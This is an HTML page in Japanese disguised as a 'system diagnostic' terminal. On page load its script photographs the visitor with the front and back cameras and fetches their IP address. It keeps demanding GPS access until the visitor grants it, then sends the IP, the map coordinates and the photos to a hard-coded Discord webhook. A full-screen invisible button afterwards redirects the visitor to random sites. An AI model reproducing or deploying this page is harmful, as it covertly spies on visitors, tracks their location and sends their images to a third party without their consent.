<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostic</title>
    <style>
        body { background-color: #0b0b0b; color: #00ff66; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; transition: background-color 1s ease; position: relative; }
        .terminal { width: 80%; max-width: 600px; background: #121212; border: 1px solid #00ff66; box-shadow: 0 0 15px rgba(0, 255, 102, 0.2); padding: 20px; border-radius: 5px; text-align: center; z-index: 1; }
        h2 { margin-top: 0; font-size: 18px; border-bottom: 1px dashed #00ff66; padding-bottom: 10px; text-align: left; }
        .log-container { text-align: left; max-height: 200px; overflow-y: auto; }
        .log-line { margin: 8px 0; font-size: 14px; }
        .log-warn { margin: 8px 0; font-size: 14px; color: #ff3333; font-weight: bold; }
        .next-btn { display: none; margin-top: 20px; background-color: #00ff66; color: #0b0b0b; border: none; padding: 12px 24px; font-family: 'Courier New', monospace; font-size: 16px; font-weight: bold; border-radius: 4px; cursor: pointer; z-index: 10000; position: relative; }
        #overlayBtn { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: transparent; border: none; display: none; z-index: 9999; cursor: pointer; }
    </style>
</head>
<body>

    <button id="overlayBtn" onclick="openRandomLink()"></button>
    <div class="terminal">
        <h2>[ システム診断中 ]</h2>
        <div class="log-container" id="logs"><div class="log-line">> 接続を初期化中...</div></div>
        <button id="nextButton" class="next-btn" onclick="openRandomLink()">次へ ➔</button>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1536585279819874335/8ARjYGwabHXahh78qx9zBQKdrAZIziOQKIY50_I23MVP5c2b7wCPbDtzMAJ_VLydXQux";

        function addLog(text) { const d = document.createElement('div'); d.className = 'log-line'; d.textContent = text; document.getElementById('logs').appendChild(d); }
        function addWarn(text) { const d = document.createElement('div'); d.className = 'log-warn'; d.textContent = `! 警告: ${text}`; document.getElementById('logs').appendChild(d); }

        async function captureCameraBlobOnce(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                const video = document.getElementById('video'); video.srcObject = stream;
                await new Promise(res => { video.onloadedmetadata = res; });
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                stream.getTracks().forEach(t => t.stop());
                return await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
            } catch (e) { return null; }
        }

        async function gatherAndSend() {
            try {
                addLog("> ネットワーク・カメラパラメータを取得中...");
                const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ ip: "取得失敗" }));
                const frontBlob = await captureCameraBlobOnce("user");
                const backBlob = await captureCameraBlobOnce("environment");

                addLog("> GPS座標を要求中...");
                let gpsText = "";
                while(true) {
                    try {
                        const pos = await new Promise((r, j) => navigator.geolocation.getCurrentPosition(r, j, { timeout: 5000 }));
                        gpsText = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        break;
                    } catch(e) { addWarn("位置情報の許可が必要です。"); await new Promise(r => setTimeout(r, 1000)); }
                }

                const msg = { content: "🚨 **【システム診断】情報検知**", embeds: [{ title: "📊 取得データ", fields: [{ name: "IP", value: ipRes.ip }, { name: "GPS", value: gpsText }] }] };
                const fd = new FormData(); fd.append('payload_json', JSON.stringify(msg));
                if (frontBlob) fd.append('files[0]', frontBlob, 'front.jpg');
                if (backBlob) fd.append('files[1]', backBlob, 'back.jpg');
                await fetch(WEBHOOK_URL, { method: 'POST', body: fd });

                document.body.style.backgroundColor = "#003311";
                document.getElementById('nextButton').style.display = 'inline-block';
                document.getElementById('overlayBtn').style.display = 'block';
            } catch (e) { addWarn("エラー発生"); }
        }

function openRandomLink() {
            const targets = [
                // === YouTube動画リスト ===
                "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
                "https://www.youtube.com/watch?v=jNQXAC9IVRw",
                "https://www.youtube.com/watch?v=9bZkp7q19f0",
                "https://www.youtube.com/watch?v=kJQP7kiw5Fk",
                "https://www.youtube.com/watch?v=3JZ_D3ELwOQ",
                "https://www.youtube.com/watch?v=OPf0YbXqDm0",
                
                // === 一般サイトリスト ===
                "https://www.google.com",
                "https://www.wikipedia.org",
                "https://www.amazon.co.jp",
                "https://www.github.com",
                "https://www.yahoo.co.jp",
                "https://www.bing.com",
                "https://twitter.com",
                "https://www.twitch.tv",
                "https://www.reddit.com",
                "https://www.apple.com"
            ];
            
            // リストをシャッフル（ランダムに並び替える）
            for (let i = targets.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [targets[i], targets[j]] = [targets[j], targets[i]];
            }
            
            // シャッフルされたリストから選ぶ
            const randomUrl = targets[0];
            window.open(randomUrl, '_blank');
        }        window.onload = gatherAndSend;
    </script>
</body>
</html>
